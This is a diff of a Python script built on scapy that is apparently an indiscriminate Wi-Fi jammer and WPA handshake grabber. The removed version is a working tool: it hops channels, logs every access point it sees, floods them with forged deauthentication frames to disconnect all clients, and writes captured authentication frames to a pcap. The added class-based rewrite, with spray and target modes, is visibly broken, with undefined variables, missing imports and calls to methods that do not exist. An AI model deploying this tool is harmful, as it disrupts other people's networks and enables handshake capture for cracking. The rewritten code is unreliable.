@@ -1,103 +1,117 @@
 #!/bin/python3
-import argparse
-import threading
-import logging
-from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Elt
+from scapy.sendrecv import sniff
+from scapy.layers.dot11 import Dot11, Dot11Elt
 from scapy.utils import PcapWriter
-from scapy.volatile import RandMAC
-from scapy.sendrecv import sniff, sendp
-from subprocess import Popen
+
 from time import sleep
 
-global AP_list
-global ignore_AP
-ignore_AP = []
-AP_list = []
+from subprocess import Popen
 
-parser = argparse.ArgumentParser(description='A program that hops 2.4GHz channels to detect beacon frames and de-authorises all wirelessly connected hosts on the AP; Authentication frames may also be captured and saved to a .pcap file specified')
-ap_method = parser.add_mutually_exclusive_group()
-verbosity = parser.add_mutually_exclusive_group()
+import threading
 
-parser.add_argument('interface', action='store', help='Sets the interface to use for sending and receiving')
+import logging
+logger = logging.getLogger(__name__)
 
-ap_method.add_argument('-l', '--ignore-list', dest='list', action='store', type=list, help='Ignore APs given by command line input (each MAC or SSID separated by spaces)')
-ap_method.add_argument('-f', '--ignore-file', dest='file', action='store', type=str, help='Ignore APs from this file (each MAC or SSID separated by newlines)')
-ap_method.add_argument('-t', '--target-AP', dest='target', action='store', type=str, help='Specifically target a single choice AP (by MAC or SSID')
+from AP import AccessPoint
 
-verbosity.add_argument('-vv', '--very-verbose', dest='verbosity', action='store_const', const=logging.DEBUG, help='Set program to log debug information')
-verbosity.add_argument('-v', '--verbose', dest='verbosity', action='store_const', const=logging.INFO, help='Set program to log normal functioning')
+class Cricket():
+	def __init__(self, ignoreBeacons, attackMode, sendint, recvint, output, searchingChannels, targets=[]):
+		self.ignoreBeacons = ignoreBeacons
+		self.attackMode = attackMode
+		self.sendint = sendint
+		self.recvint = recvint
+		self.output = output
+		self.searchingChannels = searchingChannels
+		self.targets = targets
 
-parser.add_argument('-o', '--output', dest='output', action='store', type=str, help='File to write captured Auth Frames to (will only jam if not set)')
-parser.add_argument('-c', '--channel', dest='channels', action='store', type=list, help='Channels to hop on (default is 1-11)', default=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11])
-parser.add_argument('-a', '--arm', dest='arm', action='store_true', help='Arm the WiFi jammer (will simply sniff beacons if not armed)', default=False)
+		self.handshakesFound = []
+		self.discoveredAPs = []
+		self.channelIndex = 0
 
-args = parser.parse_args()
-logging.basicConfig(format='\t%(message)s',level=args.verbosity)
+	def changeChannel(self, new_channel, interface):
+		command = ['iwconfig', interface, 'channel', newChannel]
 
-if args.list != None:
-	ignore_AP += args.list
-	logging.debug('Running with Ignore AP list from command line = ' + str(ignore_AP))
-elif args.file != None:
-	with open(args.file, 'r') as file:
-		ignore_AP += file.readlines()
-		logging.debug('Running with Ignore AP list from file = ' + str(ignore_AP))
+		Popen(command, shell=False)
 
-if args.output != None:
-	output = PcapWriter(args.output, append=True)
-	logging.debug('Setting output file = ' + str(args.output))
-else:
-	logging.debug('Running without output file')
+		logging.debug('Set channel to ' + newChannel + ' on ' + interface)
 
-def changeChannel(iface, channel):
-	global current_channel
-	current_channel = str(channel)
-	command = ['iwconfig', iface, 'channel', current_channel]
-	Popen(command, shell=False)
-	logging.debug('Set channel = ' + current_channel + ' with command = ' + str(command))
+	def channelHop(self):
+		# if the channel index is that of the last in the searchingChannels list, reset it to 0
+		if self.channelIndex == len(searchingChannels) - 1:
+			self.channelIndex = 0
+		# otherwise, increment by 1
+		else:
+			self.channelIndex += 1
+		# Then change channel
+		self.changeChannel(self.channels[self.channelIndex], self.recvint)
+		# These variables solely keep track of the channels we sniff on; it has no effect on any of the attacks
 
-def channelHop(iface, channels):
-	logging.debug('Running function channelHop(' + iface + ', ' + str(channels))
-	while True:
-		for channel in channels:
-			changeChannel(iface, channel)
-			sleep(0.1)
-
-def jammer():
-	while True:
-		if len(AP_list) != 0:
-			for AP in AP_list:
-				logging.info('De-Authenticating All Clients on AP ' + str(AP))
-				DeAuth_Frame = RadioTap()/Dot11(addr1 = RandMAC(), addr2 = AP, addr3 = AP)/Dot11Deauth(reason=2)
-				sendp(DeAuth_Frame, verbose=False)
-
-def packetHandler(packet):
-	if packet.haslayer(Dot11):
-		AP_Mac = packet.addr2
-		if packet.type == 0:
-			if packet.subtype == 8:
-				AP_name = bytes.decode(packet[Dot11Elt].info)
-				if args.target != None:
-					if AP_Mac == args.target or AP_name == args.target:
-						AP_list.append(packet.addr2)
-						logging.info('Target Found: MAC = ' + str(packet.addr2) + ', SSID = ' + AP_name + ', CH = ' + str(current_channel))
-				elif packet.addr2 not in ignore_AP or bytes.decode(packet[Dot11Elt].info) not in ignore_AP:
-					if packet.addr2 not in AP_list:
-						AP_list.append(packet.addr2)
-						logging.info('AP Found: MAC = ' + str(packet.addr2) + ', SSID = ' + AP_name + ', CH = ' + str(current_channel))
-			elif packet.subtype == 11:
-				if output:
-					output.write(packet)
-					logging.info('Authentication Frame Found: MAC = ' + str(packet.addr2) + ', SSID = ' + AP_name + ', CH = ' + str(current_channel))
+	def sniffPackets(self):
+		packets = sniff(count = 10, iface=self.recvint)
+		for packet in packets:
+			# If the packet is a frame...
+			if packet.haslayer(Dot11):
+					# If the packet is a management frame
+					if packet.type == 0:
+						essid = bytes.decode(packet[Dot11Elt].info)
+						bssid = packet.addr2
+						# If the packet is a beacon frame
+						if packet.subtype == 8:
+							# If it isn't to be ignored
+							if essid not in self.ignoreBeacons or bssid not in self.ignoreBeacons:
+								# add bssid to discoveredAPs
+								# create new AccessPoint class and append to targets
+								# ensure we don't sniff further beacons by adding to ignoreBeacons
+								channel = packet[RadioTap].Channel
+								self.discoveredAPs.append(AccessPoint(essid, bssid, channel))
+								self.ignoreBeacons.append(bssid)
+								logging.info('New AP found: ESSID = ' + essid + ', BSSID = ' +  bssid + ', CH = ' + str(channel))
+						# Elif the packet is an authentication frame
+						elif packet.subtype == 11:
+							# if a handshake hasn't been captured
+							if bssid not in self.handshakesFound:
+								# Note it's been captured and write to output file if one exists
+								self.handshakesFound.append(bssid)
+								if self.output:
+									output.write(packet)
+									logging.info('New Authentication Frame Found: ESSID = ' + essid)
+					
+					else:
+						logging.debug('Found non-auth, non-beacon management frame')
 			else:
-				logging.debug('Found non-auth, non-beacon management frame')
-	else:
-		logging.debug('Found non-management frame transmission')
+				logging.debug('Found non-management frame transmission')
+		self.channelHop()
 
-channelHopper = threading.Thread(target = channelHop, args=(args.interface, args.channels))
-beaconSniffer = threading.Thread(target = sniff, kwargs = dict(prn=packetHandler, iface=args.interface))
-jammer = threading.Thread(target = jammer)
+	def sprayAttack(self):
+		# Spray attacks every located target until it gets a handshake
+		for AccessPoint in self.discoveredAPs:
+			if AccessPoint.bssid not in self.handshakesFound:
+				self.changeChannel(AccessPoint.channel, self.sendint)
+				AccessPoint.jam(self.sendint)
 
-channelHopper.start()
-beaconSniffer.start()
-if args.arm == True:
-	jammer.start()
+	def unarmedAttack(self):
+		# Do not send any deauth
+		return
+
+	def targetAttack(self):
+		# Only deauth targets
+		for AccessPoint in self.discoveredAPs:
+			if AccessPoint.bssid in self.targets or AccessPoint.essid in self.targets:
+				self.changeChannel(AccessPoint.channel, self.sendint)
+				AccessPoint.jam(self.sendint)
+	
+	def attack(self):
+		# All three attacks condensed into one single switch
+		if self.attackMode == 'spray':
+			self.spray()
+		elif self.attackMode == 'unarmed':
+			self.unarmed()
+		elif self.attackMode == 'target':
+			self.target()
+		else:
+			logging.debug('No attack mode set')
+
+	def main(self):
+		# thread this
+		threading.Thread(target = self.sniffPackets).start()
+		threading.Thread(target = self.attack).start()
